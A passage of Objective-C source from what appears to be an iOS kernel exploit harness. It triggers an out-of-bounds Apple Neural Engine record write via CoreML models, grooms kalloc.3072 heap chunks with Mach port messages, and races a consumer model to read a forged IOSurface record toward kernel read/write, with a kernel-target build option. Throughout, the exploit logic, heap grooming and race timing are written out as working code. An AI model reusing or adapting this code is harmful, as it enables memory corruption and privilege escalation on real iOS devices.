        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                   dataType:MLMultiArrayDataTypeDouble
                                                      error:nil];
        if (!m) return nil;
        m[0] = @(vals[i]);
        NSString *key = (i == 0 && firstKey) ? firstKey
                                             : [NSString stringWithFormat:@"x_%03u", i];
        features[key] = [MLFeatureValue featureValueWithMultiArray:m];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

static double p088_predict(MLModel *model, MLDictionaryFeatureProvider *fp,
                           NSTimeInterval *dur, NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    *dur = t1 - t0;
    if (!pred) return NAN;
    MLFeatureValue *yv = [pred featureValueForName:@"y"];
    MLMultiArray *ya = yv.multiArrayValue;
    if (!ya) {
        MLFeatureValue *ov = [pred featureValueForName:@"output"];
        ya = ov.multiArrayValue;
    }
    return ya ? ya[0].doubleValue : NAN;
}

static NSString *p088_yfmt(double y) {
    return (y == y) ? [NSString stringWithFormat:@"%.6e", y] : @"NaN";
}

@implementation P088AneWriteHop

+ (NSString *)tap {
    g_p088_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p088_write_hop_log.txt"];
    g_p088_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p088_log(@"=== p088 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P088_BUILD);
    p088_log(@"Forged OUTPUT-record write hop v3 (106 triage; xref 102/103/104/105).");
    p088_log(@"  RACE INVERTED: A (254 addchain) fires FIRST; its fill lands ~tA");
    p088_log(@"  into the NEXT kalloc.3072 chunk (chunk size IS 0xC00). B = 3in127ops");
    p088_log(@"  consumer fires a VOLLEY at absolute targets - one of its [fill->map]");
    p088_log(@"  windows must bracket A's fill (v2's headstart sweep could never:");
    p088_log(@"  B done 0-1ms, A fill 4-25ms, direction inverted).");
    p088_log(@"  V7 (four 21:xx panics decoded + two structural bugs): ALL FOUR");
    p088_log(@"  panics = same class, ktextexec+0x83D350, dumping 16-byte record");
    p088_log(@"  tables {sid 175-561, symbol=0xc0+i} that are NOT our staged values");
    p088_log(@"  -> A NEVER SPILLED: aVals[i]=i+1 are dead sids and the input loop");
    p088_log(@"  aborts on the first bad record (P080 bee5f818). All D2 hits and");
    p088_log(@"  panics tonight = FOREIGN ANE jobs' record tables. Second bug: the");
    p088_log(@"  harvest emptied all 32 run ports but the refill re-armed 0-2 -");
    p088_log(@"  rounds 1+ had NO real holes. v7: A stages LIVE SIDS (P077/P080:");
    p088_log(@"  record sid == int(x_i)) and record 195 carries forgeSid; FULL");
    p088_log(@"  reverse re-arm after every harvest; pair-punch measurement");
    p088_log(@"  (record=K_{h+1}, spill=+0xC00, content-verified D2: ours iff");
    p088_log(@"  record-195 sid == forgeSid); conv rounds punch sac + witness+");
    p088_log(@"  filler after A dispatch so B's fire0 pops [filler, witness]");
    p088_log(@"  and B OWNS the spill target during fill.");
    p088_log(@"  V8 (09:24 panic decoded AT THE PC + note 116): the fill writer IS");
    p088_log(@"  CheckandPrewireBuffers - the pc landed inside it at record 192");
    p088_log(@"  (x20=x26=0xc0): 192*0x10=0xC00=kalloc.3072, entry 192 = the FIRST");
    p088_log(@"  OOB entry. A's err=-1 is a DOWNSTREAM reject (254-in program");
    p088_log(@"  refused AFTER the fill fired) - err=-1 is EXPECTED, NOT the");
    p088_log(@"  signal; the content check is. v8 adds an ourBand census per D2");
    p088_log(@"  hit (sids in our gate band or == forgeSid) so OUR fills are");
    p088_log(@"  separable from foreign 175-561 tables even without 0xC3 in view.");
#if P088_KERNEL_TARGET
    p088_log(@"*** KERNEL-TARGET BUILD: OOB slots carry kernel sid %u. PANIC POSSIBLE.", P088_KERNEL_SID);
    p088_log(@"*** Completion-only evidence: no byte proof without kread.");
#endif
    p088_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p088"];
    if (stop) {
        p088_log(@"%@", stop);
        if (g_p088_fd >= 0) { fcntl(g_p088_fd, F_FULLFSYNC); close(g_p088_fd); g_p088_fd = -1; }
        NSString *ret = g_p088_buf; g_p088_buf = nil; return ret;
    }
    p088_log(@"%@", [LabDeviceProfile identBlock]);
    {
        const LabOffTab *off = LabOff();
        if (off && off->ane_fill_cap) {
            p088_log(@"EXPECT-BAD fill_cap=1. 254 addchain -> 0xe00002c2 on this SKU. Probe still fires.");
        } else if (off && off->ane_table_size && off->ane_table_size != 0x820u) {
            p088_log(@"EXPECT-BAD ane_table_size=0x%x (T8150 0x10b8, not A14 0x820). Probe still fires.",
                     off->ane_table_size);
        } else if (!off) {
            p088_log(@"EXPECT-BAD LabOff NULL. Probe still fires.");
        }
    }

    if (!p088_resolve_iosurface()) {
        p088_log(@"[-] IOSurface dlsym FAILED - abort");
        p088_log(@"=== VERDICT === abort (iosurface). hasKread=NO hasKwrite=NO.");
        if (g_p088_fd >= 0) { fcntl(g_p088_fd, F_FULLFSYNC); close(g_p088_fd); g_p088_fd = -1; }
        NSString *ret = g_p088_buf; g_p088_buf = nil; return ret;
    }

    /* ---- target surface T ---- */
    IOSurfaceRef T = p088_surface_create(64, 64);
    if (!T) {
        p088_log(@"[-] target surface create FAILED - abort");
        p088_log(@"=== VERDICT === abort (T). hasKread=NO hasKwrite=NO.");
        if (g_p088_fd >= 0) { fcntl(g_p088_fd, F_FULLFSYNC); close(g_p088_fd); g_p088_fd = -1; }
        NSString *ret = g_p088_buf; g_p088_buf = nil; return ret;
    }
    uint32_t tSid = s_iosGetID(T);
    size_t tSize = s_iosAllocSz(T);
    p088_surface_fill(T, P088_T_MARK);
    p088_log(@"[+] T sid=%u size=%zu filled 0x%02x", tSid, tSize, P088_T_MARK);

    /* forge payload: which sid goes into the spilled records */
#if P088_KERNEL_TARGET
    uint32_t forgeSid = P088_KERNEL_SID;
    p088_log(@"[*] forge sid = KERNEL %u (completion-only evidence)", forgeSid);
#else
    uint32_t forgeSid = tSid;
    p088_log(@"[*] forge sid = T %u (in-process byte oracle)", forgeSid);
#endif
    g_p088_forgeSid = forgeSid;   /* v7: content check in the D2 harvest */

    /* v4c: there is NO MLComputeUnitsANEOnly in CoreML — the enum is
   CPUOnly / CPUAndGPU / All / CPUAndNeuralEngine ONLY. The v3b/v4b
   "ANEOnly" plan referenced an API that does not exist; Xcode 16.4
   correctly rejects it as undeclared. The GPU-excluding option is
   MLComputeUnitsCPUAndNeuralEngine: ANE preferred, CPU fallback,
   NO Metal device — which is what the AGX 309 teardown avoidance
   actually requires. */
#define P088_ANE_UNITS MLComputeUnitsCPUAndNeuralEngine

/* ---- models ----
       v4c: trio on CPUAndNeuralEngine. The 23:46:41 run died
       as a 309 SIGABRT INSIDE AGX::Device::~Device() when Espresso's
       select_metal_device (MLComputeUnitsAll) hit a wedged AGX KMD
       (getDriverInfo 0x5) and the driver teardown freed a pointer that
       was never allocated. CPUAndNeuralEngine excludes the GPU so no
       Metal device is created; the cpu twin stays CPUOnly. */
    NSError *err = nil;
    /* history: v3b defined P088_ANE_UNITS but never USED it (loads stayed
       CPUOnly -> 00:09:53 v4 tap ran all-CPU, gate correctly refused);
       v4b switched the trio to a nonexistent MLComputeUnitsANEOnly and
       failed to compile. v4c is the first build where the trio actually
       runs CPU+ANE without a Metal device. */
    MLModel *mA = p088_load(p088_model_url(P088_ADDCHAIN), P088_ANE_UNITS, &err);
    MLModel *mB = p088_load(p088_model_url(P088_CONSUMER), P088_ANE_UNITS, &err);
    MLModel *mGate = p088_load(p088_model_url(P088_GATE_MODEL), P088_ANE_UNITS, &err);
    MLModel *mGatecpu = p088_load(p088_model_url(P088_GATE_MODEL), MLComputeUnitsCPUOnly, &err);
    if (!mA || !mB || !mGate || !mGatecpu) {
        p088_log(@"[-] model load FAILED (A=%d B=%d gate=%d gatecpu=%d)",
                 mA != nil, mB != nil, mGate != nil, mGatecpu != nil);
        p088_log(@"=== VERDICT === abort (models). hasKread=NO hasKwrite=NO.");
        CFRelease(T);
        if (g_p088_fd >= 0) { fcntl(g_p088_fd, F_FULLFSYNC); close(g_p088_fd); g_p088_fd = -1; }
        NSString *ret = g_p088_buf; g_p088_buf = nil; return ret;
    }
    p088_log(@"[+] models: A=addchain254 B=3in127ops gate=127in(+cpu twin)");
    p088_log(@"    ANE trio: MLComputeUnitsCPUAndNeuralEngine - CPU+ANE, NO Metal");
    p088_log(@"    device (309 AGX teardown avoidance). GPU excluded by construction;");
    p088_log(@"    CoreML has no ANE-only option (v4b's MLComputeUnitsANEOnly never existed).");

    /* ---- gate surfaces: 128 live sids (P082/P080 instrument) ---- */
    p088_surf_t *gs = calloc(P088_GATE_SURF, sizeof(p088_surf_t));
    uint32_t nGs = 0;
    for (uint32_t i = 0; i < P088_GATE_SURF; i++) {
        IOSurfaceRef s = p088_surface_create(1, 1);
        if (!s) continue;
        gs[nGs].surf = s;
        gs[nGs].sid = s_iosGetID(s);
        gs[nGs].allocSize = s_iosAllocSz(s);
        nGs++;
    }
    if (nGs < P088_GATE_N) {
        p088_log(@"[-] gate surfaces %u/%u - abort", nGs, P088_GATE_SURF);
        p088_log(@"=== VERDICT === abort (gate surfaces). hasKread=NO hasKwrite=NO.");
        p088_free_surfs(gs, nGs);
        CFRelease(T);
        if (g_p088_fd >= 0) { fcntl(g_p088_fd, F_FULLFSYNC); close(g_p088_fd); g_p088_fd = -1; }
        NSString *ret = g_p088_buf; g_p088_buf = nil; return ret;
    }
    p088_log(@"[+] gate surfaces: %u live (ids %u..%u)", nGs, gs[0].sid, gs[nGs - 1].sid);

    /* staging-band high-water: max sid we have created so far */
    uint32_t hiSeen = tSid;
    for (uint32_t i = 0; i < nGs; i++) if (gs[i].sid > hiSeen) hiSeen = gs[i].sid;

    /* v8 D2 census band: OUR fills' entry sids sit in this band (plus
       forgeSid at symbolIndex 195); foreign tables carry driver-bound
       sids (175-561 band tonight). */
    g_p088_minGateSid = gs[0].sid;
    g_p088_maxGateSid = gs[0].sid;
    for (uint32_t i = 0; i < nGs; i++) {
        if (gs[i].sid < g_p088_minGateSid) g_p088_minGateSid = gs[i].sid;
        if (gs[i].sid > g_p088_maxGateSid) g_p088_maxGateSid = gs[i].sid;
    }
    g_p088_stageMax = hiSeen;   /* v11: ours-census ceiling starts at the gate band */
    p088_log(@"[+] D2 census band: %u..%u + staging up to %u (+forge %u; foreign band ~175-561)",
             g_p088_minGateSid, g_p088_maxGateSid, g_p088_stageMax, forgeSid);

    /* ---- PHASE G: engagement gate (127-in live sids, P082/P080 shape) ---- */
    double gvals[P088_GATE_N];
    for (uint32_t i = 0; i < P088_GATE_N; i++) gvals[i] = (double)gs[i].sid;
    MLDictionaryFeatureProvider *fpG = p088_provider(gvals, P088_GATE_N, @"x_000", &err);
    double yG = NAN;
    NSTimeInterval dG = 0, minAll = 1e9, minCpu = 1e9;
    if (fpG) {
        for (int r = 0; r < 10; r++) { err = nil; yG = p088_predict(mGate, fpG, &dG, &err); if (dG < minAll) minAll = dG; }
        for (int r = 0; r < 10; r++) { err = nil; p088_predict(mGatecpu, fpG, &dG, &err); if (dG < minCpu) minCpu = dG; }
    }
    BOOL engaged = fpG && (minAll > minCpu + 1.0 / 1000.0);
    p088_log(@"--- PHASE G: gate y=%@ minAll=%.2fms minCpu=%.2fms -> ANE %s ---",
             p088_yfmt(yG), minAll * 1000.0, minCpu * 1000.0, engaged ? "ENGAGED" : "NOT ENGAGED");
    if (!engaged) {
        p088_log(@"=== VERDICT === gate not engaged (instrument: 127-in live-sid timing).");
        p088_log(@"CPUAndNeuralEngine semantics: no GPU, but Espresso MAY silently fall");
        p088_log(@"back to CPU for the gate model. minAll ~= minCpu (gap < 1ms) means");
        p088_log(@"the ANE did NOT dispatch - silent CPU fallback or wedged ANE this");
        p088_log(@"boot. Do NOT fire rounds on a suspect boot: reboot and re-tap.");
        p088_log(@"NOTE: v1's false NOT-ENGAGED came from gating with B's own 0.05ms.");
        p088_log(@"hasKread=NO hasKwrite=NO.");
        p088_free_surfs(gs, nGs);
        CFRelease(T);
        if (g_p088_fd >= 0) { fcntl(g_p088_fd, F_FULLFSYNC); close(g_p088_fd); g_p088_fd = -1; }
        NSString *ret = g_p088_buf; g_p088_buf = nil; return ret;
    }

    /* ---- B provider: x_000=1.0 x_001=2.0 x_002=3.0 (127ops y is model-
       defined, NOT the plain sum — the diff oracle does not assume it) ---- */
    double bvals[3] = { 1.0, 2.0, 3.0 };
    MLDictionaryFeatureProvider *fpB = p088_provider(bvals, 3, @"x_000", &err);
    if (!fpB) {
        p088_log(@"[-] B provider FAILED - abort");
        p088_log(@"=== VERDICT === abort (B provider). hasKread=NO hasKwrite=NO.");
        p088_free_surfs(gs, nGs);
        CFRelease(T);
        if (g_p088_fd >= 0) { fcntl(g_p088_fd, F_FULLFSYNC); close(g_p088_fd); g_p088_fd = -1; }
        NSString *ret = g_p088_buf; g_p088_buf = nil; return ret;
    }

    /* ---- v7 A provider: LIVE SIDS everywhere. P077/P080 proved record
       sid == int(x_i); a dead sid value aborts the input loop BEFORE any
       staging (P080 bee5f818: first bad record aborts) - which is why A
       never spilled in v4-v6 (err=-1 every run). OOB 192..195 = forgeSid
       -> the spilled record 195 = B's OUTPUT record slot carries T. ---- */
    double aVals[P088_INPUTS];
    for (uint32_t i = 0; i < P088_INPUTS; i++)
        aVals[i] = (double)gs[i % nGs].sid;
    aVals[192] = (double)forgeSid;
    aVals[193] = (double)forgeSid;
    aVals[194] = (double)forgeSid;
    aVals[195] = (double)forgeSid;   /* lands on B OUTPUT record @0x30 */
    NSMutableDictionary *abuf = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < P088_INPUTS; i++) {
        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                   dataType:MLMultiArrayDataTypeDouble
                                                      error:nil];
        if (!m) break;
        m[0] = @(aVals[i]);
        abuf[[NSString stringWithFormat:@"x_%03u", i]] = [MLFeatureValue featureValueWithMultiArray:m];
    }
    MLDictionaryFeatureProvider *fpA =
        [[MLDictionaryFeatureProvider alloc] initWithDictionary:abuf error:&err];
    if (!fpA) {
        p088_log(@"[-] A provider FAILED - abort");
        p088_log(@"=== VERDICT === abort (A provider). hasKread=NO hasKwrite=NO.");
        p088_free_surfs(gs, nGs);
        CFRelease(T);
        if (g_p088_fd >= 0) { fcntl(g_p088_fd, F_FULLFSYNC); close(g_p088_fd); g_p088_fd = -1; }
        NSString *ret = g_p088_buf; g_p088_buf = nil; return ret;
    }

    /* ---- PHASE F: A-first race, B volley, sentinel-net adjacency ---- */
    p088_log(@"--- PHASE F (v10 fresh-A): %u rounds; persistent run; forge sid=%u ---",
             P088_ROUNDS, forgeSid);
    uint32_t touches = 0, fillHits = 0, bFires = 0, bAnom = 0;
    double lastATms = 5.0;   /* warm prior: fill lands ~3ms after A dispatch */
    int    witness = -1;   /* spill-target index measured by a fill hit */
    BOOL   convDead = NO;  /* v7 bad case: A releases the queue chunk last */
    BOOL   aOK = NO;       /* v7: A completed with err=none at least once */
    NSString *lastAErr = @"none"; /* v8: last round's A error for the verdict */

    /* --- v5-inherited: build the sentinel run ONCE. v4 rebuilt it every round and
       the rebuild reversed the freelist, walking the fill target +1 per
       round (28->29->30->31) so a calibrated pair could never lock. --- */
    p088_held_t run[P088_RUN_N];
    uint32_t nRun = 0;
    for (uint32_t i = 0; i < P088_RUN_N; i++) {
        mach_port_t p = p088_make_port();
        if (p == MACH_PORT_NULL) break;
        run[nRun].port = p;
        run[nRun].index = 0x3000u | i;   /* round-independent: one persistent run */
        run[nRun].alive = YES;
        if (!p088_send_simple(p, run[nRun].index)) {
            mach_port_destroy(mach_task_self(), p);
            run[nRun].port = MACH_PORT_NULL;
            break;
        }
        nRun++;
    }
    if (nRun < P088_RUN_B0 + 2) {
        p088_log(@"[-] sentinel run short (%u/%u) - abort", nRun, P088_RUN_N);
        for (uint32_t i = 0; i < nRun; i++)
            if (run[i].port != MACH_PORT_NULL)
                mach_port_destroy(mach_task_self(), run[i].port);
        p088_log(@"=== VERDICT === abort (sentinel run short). hasKread=NO hasKwrite=NO.");
        p088_free_surfs(gs, nGs);
        CFRelease(T);
        if (g_p088_fd >= 0) { fcntl(g_p088_fd, F_FULLFSYNC); close(g_p088_fd); g_p088_fd = -1; }
        NSString *ret = g_p088_buf; g_p088_buf = nil; return ret;
    }
    p088_log(@"  persistent run: %u live kmsgs, indices 0x3000..0x%04x",
             nRun, 0x3000u + nRun - 1);

    /* v14 band pre-extension (v13 boots' lesson): r0's D2 census ran BEFORE
       the first [stage] scan, so fills carrying fresh-A staging sids
       (867..1631 tonight) misread FOREIGN against the model-load ceiling
       (866) -> hitOurs=0 -> witness never armed -> conv never fired. One
       stage scan NOW extends g_p088_stageMax past everything the fresh-A
       class has allocated so the FIRST harvest classifies correctly. */
    {
        uint32_t hiPre = hiSeen;
        p088_stage_scan(&hiPre);
        if (hiPre > hiSeen) {
            hiSeen = hiPre;
            p088_log(@"  [v14] census band pre-extended to %u (pre-round stage scan)",
                     hiSeen);
        }
    }

    for (uint32_t r = 0; r < P088_ROUNDS && touches == 0; r++) {
        /* v8 schedule. A err=-1 is EXPECTED (downstream reject after the
           prewire fill fires per predict), so the fill timing is
           unknown -> conv rounds volley early+wide. Measurement
           rounds skip B entirely (B churn between rounds pollutes the
           freelist and would eat A's released chunks). */
        BOOL conv = (witness >= 0 && run[witness].alive && !convDead);
        uint32_t nFires = conv ? P088_VOL_CONV : 0;
        double stepMs   = P088_VOL_CONV_STEP;
        double baseMs   = P088_VOL_FIRST_MS;

        p088_log(@"[r%u] %s: fires=%u step=%.1fms first@%.2fms (A prior %.1fms)",
                 r, conv ? "CONV" : "MEASURE", nFires, stepMs, baseMs, lastATms);

        /* --- v7 punch schedule ---
           v13: prefill 6 same-CPU magazine frees FIRST so the round's two
           punches complete the free half (capacity 8/half/CPU) and the
           swap fires: A's pop = K_h deterministically (not freelist-luck).
           MEASURE rounds: PAIR punch (h+1) then (h). Freelist becomes
             [K_h(top), K_{h+1}] -> A pops queue=K_h, record=K_{h+1}; the
             spill lands at K_{h+1}+0xC00. A content-verified D2 hit at
             port w measures the pair (K_{h+1} <-> K_w) for this boot.
           CONV rounds: ONE sacrificial punch -> A's record pop = A's
             LAST-RELEASED chunk from the previous measurement round (a
             per-boot-constant 50%: the verified record chunk K_{h+1},
             whose neighbor is the measured witness, or the unverified
             queue chunk K_h). Witness + filler are punched right after
             A's dispatch (below) so B's fire0 pops [K_filler(queue),
             K_witness(record)] and B OWNS the spill target during the
             fill. Bad case (our table at w' != witness) disables conv. */
        uint32_t h = P088_RUN_A0 + 2 * r;                 /* pair base   */
        if (h + 1 >= nRun) h = P088_RUN_A0;
        uint32_t sac = P088_RUN_A0 + 2 * P088_ROUNDS + r; /* conv queue  */
        if (sac >= nRun) sac = P088_RUN_A0;
        int punched[2] = { -1, -1 };   /* [0]=queue hole, [1]=witness (volley) */
        if (conv) {
            p088_mag_prefill(5);   /* v13: 5 + sac(1) = 6... keep depth headroom:
                                      punch the pair on the NEXT prefill boundary */
            p088_punch(run[sac].port); run[sac].alive = NO;
            punched[0] = (int)sac;
            p088_log(@"  run %u live; conv queue hole = run[%u] (sac); "
                     @"record pop = previous round's last-released chunk",
                     nRun - 1, punched[0]);
        } else {
            p088_mag_prefill(6);   /* v13: +2 pair punches = capacity 8 -> swap */
            p088_punch(run[h + 1].port); run[h + 1].alive = NO;
            p088_punch(run[h].port);     run[h].alive = NO;
            punched[0] = (int)h;
            p088_log(@"  run %u live; prefill=6 + PAIR punched run[%u] then run[%u] -> "
                     @"mag swap; A pops queue=K_%u, record=K_%u (spill=K_%u+0xC00) DET'd",
                     nRun - 2, h + 1, h, h, h + 1, h + 1);
        }

        /* --- dispatch A (fill fires at ~tA inside A's submit) ---
           v10 FRESH-INSTANCE A (p087→p073 v6 lesson, note 220/221): a repeat
           predict on the SAME model instance is a CheckandPrewire resource
           CACHE HIT — the record loop (`local_88 == 0` gate, Ghidra
           874c070) never runs and NO records are written. v9's rounds
           1-3 rejected in 1.7-1.8ms with cum-1 fills = cached A, not
           "per-predict fill". Load a fresh A per round: new program
           stream => all resources are lookup misses => a genuine fill
           fires in every round's window. */
        MLModelConfiguration *cfgA10 = [[MLModelConfiguration alloc] init];
        cfgA10.computeUnits = P088_ANE_UNITS;
        NSError *lErrA10 = nil;
        MLModel *mA10 = [MLModel modelWithContentsOfURL:
                          p088_model_url(P088_ADDCHAIN) configuration:cfgA10 error:&lErrA10];
        __block MLModel *mUse = mA10 ?: mA;
        if (!mA10) p088_log(@"  [v10] A load FAILED %@ — falling back to cached A", lErrA10 ?: @"-");
        __block double yA = NAN;
        __block NSString *aErr = @"none";
        __block NSTimeInterval dA = 0;
        dispatch_semaphore_t aDone = dispatch_semaphore_create(0);
        CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
        /* v12 measure-volley: the 00:00 v10 boot (4 fills) and the 00:27 v11
           boot (0 D2 hits; its 00:28 MAF panic carried OUR staging-band sids
           939/818/1045) prove fills fire every round but the D2 census only
           samples ~1/4 of them into the run ports. MEASURE rounds now fire
           3 back-to-back FRESH-A prewires (3 fills) before the harvest;
           CONV rounds keep the single timed A the volley window needs. */
        __block uint32_t aVolley = 0;
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            uint32_t reps = conv ? 1 : 3;
            for (uint32_t rep = 0; rep < reps; rep++) {
                if (rep > 0) {
                    MLModelConfiguration *cfg12 = [[MLModelConfiguration alloc] init];
                    cfg12.computeUnits = P088_ANE_UNITS;
                    NSError *le2 = nil;
                    MLModel *mFresh12 = [MLModel modelWithContentsOfURL:
                                          p088_model_url(P088_ADDCHAIN) configuration:cfg12 error:&le2];
                    if (!mFresh12) {
                        p088_log(@"  [v12] A reload #%u FAILED — volley shortened", rep);
                        break;
                    }
                    mUse = mFresh12;
                }
                NSError *e = nil;
                yA = p088_predict(mUse, fpA, &dA, &e);
                aErr = e.localizedDescription ?: @"none";
                aVolley++;
            }
            dispatch_semaphore_signal(aDone);
        });

        /* --- v6 CONVERSION: punch the witness port NOW, before fire0. Its
           chunk goes to freelist top; B's fire0 pops it and B's records are
           written INTO the spill target. A's fill at ~tA overwrites that
           chunk with the forged table (record 195 at +0x30 = B's OUTPUT
           slot); a B consume after tA and before B's next fill reads the
           forge and surfaces sid forgeSid = T. --- */
        if (conv && witness >= 0 && run[witness].alive) {
            p088_punch(run[witness].port); run[witness].alive = NO;
            punched[1] = witness;
            /* filler: a live neighbor port so B's 2-pop consume takes
               [K_filler(queue), K_witness(record)] - the forged record 195
               lands at K_witness+0x30 = B's OUTPUT record slot. */
            uint32_t fl = (witness + 1 < (int)nRun)
                          ? (uint32_t)(witness + 1) : (uint32_t)(witness - 1);
            if (run[fl].alive) {
                p088_punch(run[fl].port); run[fl].alive = NO;
            }
            p088_log(@"  [WIN] witness run[%d] + filler run[%u] punched "
                     @"post-dispatch (B pops [K_%u(queue), K_%d(record)])",
                     witness, fl, fl, witness);
        }

        /* --- B volley: sequential fires at absolute targets; T diff per fire --- */
        BOOL touched = NO;
        for (uint32_t i = 0; i < nFires; i++) {
            double tgt = baseMs + stepMs * (double)i;
            CFAbsoluteTime now = CFAbsoluteTimeGetCurrent();
            if (t0 + tgt / 1000.0 > now) usleep((useconds_t)((t0 + tgt / 1000.0 - now) * 1e6));
            NSError *e2 = nil;
            NSTimeInterval dB = 0;
            double yB = p088_predict(mB, fpB, &dB, &e2);
            bFires++;
            NSString *e2s = e2.localizedDescription ?: @"none";
            if (i == 0)
                p088_log(@"  fire0 y=%@ t=%.2fms (B sanity)", p088_yfmt(yB), dB * 1000.0);
            int td = p088_surface_diff(T, tSid, "T");
            if (td) {
                touched = YES; touches++;
                p088_log(@"  fire %u @%.2fms: y=%@ t=%.2fms err=%@ -> FORGE WINDOW HIT",
                         i, tgt, p088_yfmt(yB), dB * 1000.0, e2s);
                break;
            }
            if (![e2s isEqualToString:@"none"]) {
                bAnom++;
                p088_log(@"  fire %u @%.2fms: B ANOMALY err=%@ t=%.2fms (smashed-consume evidence)",
                         i, tgt, e2s, dB * 1000.0);
            }
        }
        if (touched) {
            p088_log(@"  [+] volley stopped on touch (round %u)", r);
        }

        /* --- wait A (fill time for the dense rounds) --- */
        CFAbsoluteTime tA1 = CFAbsoluteTimeGetCurrent();
        long w = dispatch_semaphore_wait(aDone, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
        if (w == 0) {
            lastATms = dA * 1000.0;
            if ([aErr isEqualToString:@"none"]) aOK = YES;
        }
        lastAErr = aErr;
        p088_log(@"  A y=%@ t=%.1fms err=%@ %s (v12 measure-volley: %u fresh prewire%s)",
                 p088_yfmt(yA),
                 (w == 0 ? dA * 1000.0 : (tA1 - t0) * 1000.0), aErr,
                 (w != 0) ? "(STILL IN-FLIGHT 10s)" : "",
                 aVolley, aVolley == 1 ? "" : "s");

        /* --- D2: harvest the whole run -> fill-hit INDEX MAP (no destroy:
           the run is persistent; emptied ports are re-armed instead).
           In conv rounds the spill lands in the PUNCHED witness chunk by
           design (unobservable here) - 0 hits is the expected line and
           T-touch / bAnom are the signals. --- */
        uint32_t rHits = 0;
        int hitIdx = -1;
        for (uint32_t i = 0; i < nRun; i++) {
            if (!run[i].alive) continue;
            int hres = p088_harvest_one(&run[i], "run");
            if (hres < 0) {
                rHits++; fillHits++;
                g_p088_ourBandTotal += g_p088_lastOurBand;
                g_p088_cookieTotal += g_p088_lastCookie;
                if (hitIdx < 0) hitIdx = (int)i;
                if (g_p088_hitOurs) {
                    if (!conv) {
                        /* v7: witness = the measured LIVE spill target
                           (content-verified OUR table). The pair
                           (record chunk K_{h+1} -> run[i]) is hardware-
                           measured for this boot. */
                        witness = (int)i;
                        p088_log(@"  [D2] OUR SPILL PAIR MEASURED: run[%u] is "
                                 @"live-adjacent to A's record chunk K_%u", i, h + 1);
                    } else if ((int)i != witness) {
                        p088_log(@"  [D2] BAD CASE: our table at run[%u] != witness "
                                 @"run[%d] (A released the QUEUE chunk last this boot)",
                                 i, witness);
                        p088_log(@"  [D2] conv geometry unusable on this boot - "
                                 @"remaining rounds measure only");
                        convDead = YES;
                    } else {
                        p088_log(@"  [D2] our table at the witness port itself "
                                 @"(B did not own the chunk - punch landed late)");
                    }
                } else {
                    p088_log(@"  [D2] FOREIGN smash at run[%u] - adjacency of "
                             @"A's chunk NOT measured (tonight's panic class)", i);
                }
            }
        }
        p088_log(@"  [D2] round fill hits: %u (cum %u)", rHits, fillHits);
        if (conv && rHits == 0)
            p088_log(@"  [D2] 0 hits expected in conv: spill went into the punched "
                     @"witness chunk (T-touch / bAnom are the signals)");
        if (!conv && hitIdx < 0)
            p088_log(@"  [D2] no our-table hit in measure round %u: A's fill fired "
                     @"(per-predict prewire) but landed non-adjacent or foreign-adjacent "
                     @"this round (ourBand totals tell which)", r);

        /* --- v7 FULL re-arm, REVERSE index order. The harvest receives in
           index order -> freelist top = highest index; re-arming 31..0
           homes EVERY port deterministically (each re-arm pops its own
           chunk) and leaves A's released chunks on top for the next
           round's punches. v5/v6 re-armed only 0-2 ports: the run was
           DEAD after round 0 and rounds 1+ punched EMPTY ports (no-op
           holes) - tonight's free-chunk panic class. --- */
        uint32_t reArmed = 0;
        for (uint32_t i = nRun; i-- > 0;) {
            if (!run[i].alive) {
                p088_rearm(&run[i]);
                if (run[i].alive) reArmed++;
            }
        }
        p088_log(@"  [REFILL] %u ports re-armed (FULL reverse order; run stays live)",
                 reArmed);

        /* --- staging-band second oracle (105) --- */
        p088_stage_scan(&hiSeen);
    }

    /* --- v5-inherited: single teardown, AFTER the loop (run survives all rounds) --- */
    for (uint32_t i = 0; i < nRun; i++)
        if (run[i].port != MACH_PORT_NULL)
            mach_port_destroy(mach_task_self(), run[i].port);

    /* ---- verdict ---- */
    p088_log(@"=== VERDICT ===");
    /* v8: err=-1 is a DOWNSTREAM reject - the 254-in program is refused
       AFTER the CheckandPrewire fill already fired (09:24 panic pc inside
       the prewire at record 192 = the first OOB entry). Completion is NOT
       required for the hop and NOT the signal; the content check is. */
    p088_log(@"A last err=%@ (downstream reject - EXPECTED; with v10 fresh-A every", lastAErr);
    p088_log(@"round prewired anew: same-instance repeats are cache hits that write");
    p088_log(@"NO records (v9's 'per-predict fill' was wrong - the t=1.7ms rounds");
    p088_log(@"were caches). aOK(ever completed)=%d.", aOK ? 1 : 0);
    p088_log(@"D2 ourBand entries across all hits: %u (0 = every observed fill was", g_p088_ourBandTotal);
    p088_log(@"foreign). OUR fill observed = ourBand>0 or record-195 sid==forgeSid.");
    p088_log(@"v9 zone-cookie records (symbol 0xC0..0xFF = OOB band) across all hits: %u", g_p088_cookieTotal);
    p088_log(@"(a hit counts as OURS only on the full triple: sid==forgeSid/gate band,");
    p088_log(@"symbol in the cookie band, flags==0x100000001 - err==0 is never the signal).");
#if P088_KERNEL_TARGET
    if (bFires > 0 && bAnom == 0) {
        p088_log(@"KERNEL-TARGET volley completed %u fires with no abort. Completion-",
                 bFires);
        p088_log(@"only inference: forged output sid %u reached the consume path.", forgeSid);
        p088_log(@"NO byte proof possible without kread. Do NOT set hasKwrite from this.");
        [[P007Board shared] recordEvent:@"p088_kernel_fire" kind:@"completion_only"
                                 detail:[NSString stringWithFormat:@"sid=%u fires=%u", forgeSid, bFires]
                                 source:@"p088"];
    } else {
